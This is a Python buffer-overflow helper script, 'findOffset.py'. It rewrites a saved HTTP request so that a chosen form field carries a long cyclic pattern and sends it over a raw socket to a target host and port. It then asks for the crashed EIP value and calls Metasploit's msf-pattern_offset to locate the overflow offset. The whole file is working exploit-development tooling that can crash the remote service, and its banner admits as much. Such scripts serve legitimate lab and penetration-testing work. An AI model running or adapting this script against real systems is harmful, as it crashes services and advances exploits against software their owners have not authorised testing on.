#!/usr/bin/python3
import socket
import time
import sys
import os

if len(sys.argv) != 6:
    print("\n Usage : " + sys.argv[0] + " <request file> <host ip> <port> <target form tag name> <pattern>")
    sys.exit(1)

print("================================")
print("         findOffset.py")
print("--------------------------------")
print("    created by Xanthorrhizol")
print(" (xanthorrhizol@protonmail.com)")
print("================================")
print("\nIt is a python script to find offset to do BOF.")
print("\nIt can crash the target system.\nDON'T USE THIS FOR ATTACK OTHER SYSTEM.\nThe creater don't take responsability for other user's usage.\n\n")
agree = input("Agree and start?[y/N]\t")
if agree != "y" and agree != "Y":
    sys.exit(0)
print("---")
host = sys.argv[2]
port = int(sys.argv[3])
targetform = sys.argv[4]
pattern = sys.argv[5]
try:
    print("Sending evil pattern")
    buffer = ""
    f = open(sys.argv[1], 'r')
    line = f.readline().replace("\n","\r\n")
    while len(line) > 0:
        if len(line.split("Content-Length")) > 1:
            line = "Content-Length: {to modify}\r\n"
        if len(line.split(targetform)) > 1:
            content = targetform + "=" + pattern + "&" + line.split(targetform)[1].split("&")[1]
            line = content
        buffer += line
        line = f.readline().replace("\n","\r\n")
    f.close()
    buffer = buffer.replace("{to modify}", str(len(content)))
    #print(bytes(buffer, "utf-8")) # debug
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((host, port))
    s.send(bytes(buffer, "utf-8"))
    s.close()
except:
    print("\nFAIL : Could not connect")
    sys.exit(1)
print("\nPattern successfully sent")
eip = input("what is the EIP now ?\t")
print()
os.system("msf-pattern_offset -l "+str(len(pattern))+" -q "+str(eip))
